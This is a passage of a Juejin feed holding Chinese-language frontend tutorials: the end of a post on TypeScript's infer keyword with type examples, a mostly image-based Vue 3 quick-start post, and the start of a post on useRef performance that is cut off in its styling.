<pre><code class="hljs language-typescr" lang="typescr">// 内置的 ReturnType 实现原理
type MyReturnType&lt;T&gt; = T extends (...args: any[]) =&gt; infer R ? R : never;

function foo(): string {
  return "hello";
}

type FooReturn = MyReturnType&lt;typeof foo&gt;; // string
</code></pre>
<h3 data-id="heading-3">2. <strong>获取函数参数类型</strong></h3>
<pre><code class="hljs language-typescr" lang="typescr">// 获取第一个参数类型
type FirstParam&lt;T&gt; = T extends (first: infer P, ...rest: any[]) =&gt; any ? P : never;

// 获取所有参数类型（元组）
type Params&lt;T&gt; = T extends (...args: infer P) =&gt; any ? P : never;

function bar(x: number, y: string): void {}

type BarFirstParam = FirstParam&lt;typeof bar&gt;; // number
type BarParams = Params&lt;typeof bar&gt;; // [number, string]
</code></pre>
<h3 data-id="heading-4">3. <strong>获取数组/元组元素类型</strong></h3>
<p>typescript</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">ArrayElement</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> (infer U)[] ? U : <span class="hljs-built_in">never</span>;

<span class="hljs-keyword">type</span> <span class="hljs-title class_">StrArrayElement</span> = <span class="hljs-title class_">ArrayElement</span>&lt;<span class="hljs-built_in">string</span>[]&gt;; <span class="hljs-comment">// string</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">NumArrayElement</span> = <span class="hljs-title class_">ArrayElement</span>&lt;<span class="hljs-built_in">number</span>[]&gt;; <span class="hljs-comment">// number</span>
</code></pre>
<h3 data-id="heading-5">4. <strong>获取 Promise 的解析类型</strong></h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">UnwrapPromise</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Promise</span>&lt;infer U&gt; ? U : T;

<span class="hljs-keyword">type</span> <span class="hljs-title class_">PromiseString</span> = <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>&gt;;
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Unwrapped</span> = <span class="hljs-title class_">UnwrapPromise</span>&lt;<span class="hljs-title class_">PromiseString</span>&gt;; <span class="hljs-comment">// string</span>
</code></pre>
<h2 data-id="heading-6">实际应用示例</h2>
<h3 data-id="heading-7">示例1：提取对象值类型</h3>
<pre><code class="hljs language-typescr" lang="typescr">type ValueOf&lt;T&gt; = T extends { [key: string]: infer V } ? V : never;

type Obj = { a: number; b: string };
type Values = ValueOf&lt;Obj&gt;; // number | string
</code></pre>
<h3 data-id="heading-8">示例2：提取构造函数实例类型</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">InstanceType</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-keyword">new</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>[]) =&gt; infer R ? R : <span class="hljs-built_in">any</span>;

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }
}

<span class="hljs-keyword">type</span> <span class="hljs-title class_">AnimalInstance</span> = <span class="hljs-title class_">InstanceType</span>&lt;<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Animal</span>&gt;; <span class="hljs-comment">// Animal</span>
</code></pre>
<h3 data-id="heading-9">示例3：递归解包嵌套 Promise</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">DeepUnwrapPromise</span>&lt;T&gt; = 
  T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Promise</span>&lt;infer U&gt; ? <span class="hljs-title class_">DeepUnwrapPromise</span>&lt;U&gt; : T;

<span class="hljs-keyword">type</span> <span class="hljs-title class_">NestedPromise</span> = <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>&gt;&gt;;
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Result</span> = <span class="hljs-title class_">DeepUnwrapPromise</span>&lt;<span class="hljs-title class_">NestedPromise</span>&gt;; <span class="hljs-comment">// string</span>
</code></pre>
<h2 data-id="heading-10">使用注意事项</h2>
<h3 data-id="heading-11">1. <strong>只能用在条件类型的 extends 子句中</strong></h3>
<pre><code class="hljs language-typescr" lang="typescr">// ✅ 正确
type Example1&lt;T&gt; = T extends Array&lt;infer U&gt; ? U : never;

// ❌ 错误：infer 不能单独使用
type Example2&lt;T&gt; = infer U; // 编译错误
</code></pre>
<h3 data-id="heading-12">2. <strong>多个 infer 可以同时使用</strong></h3>
<pre><code class="hljs language-typescr" lang="typescr">type Zip&lt;T, U&gt; = T extends [infer A, ...infer RestT]
  ? U extends [infer B, ...infer RestU]
    ? [[A, B], ...Zip&lt;RestT, RestU&gt;]
    : []
  : [];

type Result = Zip&lt;[1, 2], ['a', 'b']&gt;; // [[1, 'a'], [2, 'b']]
</code></pre>
<h3 data-id="heading-13">3. <strong>协变位置 vs 逆变位置</strong></h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// infer 在协变位置（返回类型）</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">GetReturnType</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> () =&gt; infer R ? R : <span class="hljs-built_in">never</span>;

<span class="hljs-comment">// infer 在逆变位置（参数类型）</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">GetArgType</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> (<span class="hljs-attr">arg</span>: infer A) =&gt; <span class="hljs-built_in">any</span> ? A : <span class="hljs-built_in">never</span>;
</code></pre>
<h2 data-id="heading-14">实战技巧</h2>
<h3 data-id="heading-15">1. <strong>类型守卫与 infer</strong></h3>
<pre><code class="hljs language-typescr" lang="typescr">function isPromise&lt;T&gt;(value: any): value is Promise&lt;T&gt; {
  return value &amp;&amp; typeof value.then === 'function';
}

async function handle&lt;T&gt;(input: T | Promise&lt;T&gt;): Promise&lt;T&gt; {
  if (isPromise(input)) {
    // 这里 input 被推断为 Promise&lt;T&gt;
    return input;
  }
  return Promise.resolve(input);
}
</code></pre>
<h3 data-id="heading-16">2. <strong>构建实用类型工具</strong></h3>
<pre><code class="hljs language-typescr" lang="typescr">// 提取所有方法的返回类型
type MethodsReturnType&lt;T&gt; = {
  [K in keyof T]: T[K] extends (...args: any[]) =&gt; infer R ? R : never;
};

// 提取特定属性的类型
type PropType&lt;T, K extends keyof T&gt; = T extends { [P in K]: infer V } ? V : never;
</code></pre>
<h2 data-id="heading-17">总结</h2>
<p><code>infer</code> 的核心作用：<strong>在条件类型中提取未知类型的内部结构</strong>。它是 TypeScript 类型系统的高级特性，常用于：</p>
<ol>
<li><strong>类型提取</strong>：从已有类型中提取部分类型信息</li>
<li><strong>类型转换</strong>：将一个类型转换为另一种形式</li>
<li><strong>类型推导</strong>：根据上下文推导出具体类型</li>
<li><strong>工具类型创建</strong>：构建复杂的实用类型工具</li>
</ol>
<p>掌握 <code>infer</code> 的关键是多实践，从简单的函数返回类型提取开始，逐步应用到更复杂的类型操作中。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[vue3快速入门]]></title>    <link>https://juejin.cn/post/7594028166135562240</link>    <guid>https://juejin.cn/post/7594028166135562240</guid>    <pubDate>2026-01-12T12:18:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594028166135562240" data-draft-id="7594028166135513088" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="vue3快速入门"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2026-01-12T12:18:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户24825782481"/> <meta itemprop="url" content="https://juejin.cn/user/4329195838661722"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            vue3快速入门
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4329195838661722/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户24825782481
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-12T12:18:05.000Z" title="Mon Jan 12 2026 12:18:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、准备</h2>
<h4 data-id="heading-1">1、引入vue模块,导入createApp函数</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f30e6a52f65842b5a732c68aa8e2f674~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MjQ4MjU3ODI0ODE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768832981&amp;x-signature=mHA4B3XhW%2BF0UE9OmGKt5cqbxUQ%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-2">2、创建vue程序应用实例</h4>
<p>createApp函数大括号进行传参
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3f615869ceaa43de8b5817884b664dde~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MjQ4MjU3ODI0ODE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768832981&amp;x-signature=evdO0QAWosaI1MRll9WVoLKplMg%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-3">3、准备元素div，被vue控制</h4>
<p>createApp函数链式调用mount()方法用于控制页面标签div，mount()方法中的参数app是div的id</p>
<h6 data-id="heading-4">注意：参数要加#，标签被vue控制，该标签下的子标签也会被控制</h6>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a07247b807334b9ab9f12052c97e6b66~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MjQ4MjU3ODI0ODE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768832981&amp;x-signature=fh0kOcd8ecvda%2FTdHUtEQzDWyEA%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-5">二、构建用户界面</h2>
<h4 data-id="heading-6">1.准备数据</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c62b63bb3a1c42f7a7881d98b87951ed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MjQ4MjU3ODI0ODE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768832981&amp;x-signature=zMV3wOl9Lnd9oGJKBCrsuB8R%2BTg%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-7">2.用插值表达式渲染页面</h4>
<p>插值表达式就是两个花括号，里面是键名:<code>&lt;h1&gt;{{msg}}&lt;h1&gt;</code></p>
<p>data函数定义数据</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9c739f144f524bada5c241db863520cd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MjQ4MjU3ODI0ODE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768832981&amp;x-signature=rrdzmnIQKIJLPWTRtP8QAu8usSg%3D" alt="image.png" loading="lazy"/>
渲染结果：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f37b7b5b414445c5a715a9bf4703f5d1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MjQ4MjU3ODI0ODE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768832981&amp;x-signature=xiu3awDNanWlRj%2BhoUR5UvCX5OA%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-8">三、vue的生命周期</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2dac80e5a4294948a71b57838c3ca6a8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MjQ4MjU3ODI0ODE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768832981&amp;x-signature=5jkshlO7VyIR97EmreWAz6YaJlQ%3D" alt="image.png" loading="lazy"/></p>
<h6 data-id="heading-9">常用的就两三个，这里记住mounted就行</h6>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6fe9e67971044981bd5170386e74dad7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MjQ4MjU3ODI0ODE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768832981&amp;x-signature=aSPMpIIla9p3J9AoR%2BFFcIAW9m4%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-10">四、Vue项目创建和启动</h2>
<h4 data-id="heading-11">Vue项目目录结构</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bf5a2aa47f0c4b65a11f14d7cc183ecf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MjQ4MjU3ODI0ODE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768832981&amp;x-signature=TX6Wi3JAlC7v6RgK1%2B2mBRg1xUc%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-12">vue项目启动</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6fd7b42bdfe34174b2ab35b2bcc47441~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MjQ4MjU3ODI0ODE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768832981&amp;x-signature=4GkoP%2FK%2BcQi9llB%2FlkY1nqpTPfo%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-13">五、vue项目开发流程</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c94f64f5f7b74284a30a05195f85b7be~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MjQ4MjU3ODI0ODE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768832981&amp;x-signature=Vvf0fOqLtIubIlMe9lqQeDHCaDc%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f9b0dd2d502b4945aabe6f99821235b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MjQ4MjU3ODI0ODE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768832981&amp;x-signature=PxbwGWA%2BuIjTMz3YGDPn5hG6I2w%3D" alt="image.png" loading="lazy"/>
第一种是vue2的写法，export default{}默认导出js对象</p>
<p>第二种是vue3写法，响应式（数据页面相互绑定），硬性要求要在script标签里面加上setup</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b3b01b8182f54a00aef117b1c5969554~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MjQ4MjU3ODI0ODE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768832981&amp;x-signature=7KORc%2FOSMx3yAa8Zofy5kwonWXw%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-14">六、vue的API风格</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7e075e90e3c14d81a8497e4a4b72e57e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MjQ4MjU3ODI0ODE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768832981&amp;x-signature=IJOgIe7LhuNCkkUZB2eA%2FBIy680%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6cf7af6800884a05a988cdf984ead89c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MjQ4MjU3ODI0ODE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768832981&amp;x-signature=GFGDRfpFNjYfk77p%2FGLDN8ndfcE%3D" alt="image.png" loading="lazy"/>
组合式api需要将数据设置为响应式数据，必须与ref联动才能激活响应式</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ecbf0b2acf2a4462a2e4a3c002cb2f6b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MjQ4MjU3ODI0ODE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768832981&amp;x-signature=eoINe7unpjX6waD4Qgq7FTIB%2BFY%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[useRef存在的潜在性能问题]]></title>    <link>https://juejin.cn/post/7594322573453475883</link>    <guid>https://juejin.cn/post/7594322573453475883</guid>    <pubDate>2026-01-13T02:39:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594322573453475883" data-draft-id="7594627998838849578" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="useRef存在的潜在性能问题"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-13T02:39:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Jolyne_"/> <meta itemprop="url" content="https://juejin.cn/user/339101640827981"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            useRef存在的潜在性能问题
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/339101640827981/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Jolyne_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T02:39:39.000Z" title="Tue Jan 13 2026 02:39:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body 